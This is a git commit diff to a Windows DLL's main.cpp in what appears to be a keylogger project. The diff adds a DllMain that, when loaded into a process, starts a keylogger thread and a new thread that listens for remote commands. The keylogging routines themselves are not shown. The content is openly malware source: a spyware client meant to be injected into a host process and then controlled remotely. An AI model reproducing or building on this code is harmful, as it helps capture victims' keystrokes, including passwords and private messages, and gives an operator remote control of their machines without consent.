4be701b388bf1bc7a3aa2dd2d22d63667350e550
Erick Barrera <ebarr019@fiu.edu>
2014-02-21 22:50:18 -0500

    Update main.cpp
    Created new thread for client to listen on.

--- src/client/library/main.cpp
+++ src/client/library/main.cpp
@@ -1,3 +1,5 @@
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "stdafx.h"
 #include "keylogger.h"
 
 DWORD MainThread(LPVOID threadParam)
@@ -6,18 +8,25 @@ DWORD MainThread(LPVOID threadParam)
 	return 0;
 }
 
+DWORD ListenForCommands(LPVOID threadParam)
+{
+	StartListen();
+	return 0;
+}
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
 	switch (fdwReason)
 	{
-		case DLL_PROCESS_ATTACH:
-			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, NULL);
-			break;
-		case DLL_PROCESS_DETACH:
-			StopKeyLogger();
-			break;
-		default:
-			break;
+	case DLL_PROCESS_ATTACH:
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, NULL);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenForCommands, NULL, 0, NULL);
+		break;
+	case DLL_PROCESS_DETACH:
+		StopKeyLogger();
+		break;
+	default:
+		break;
 	}
-    return TRUE;
+	return TRUE;
 }
+
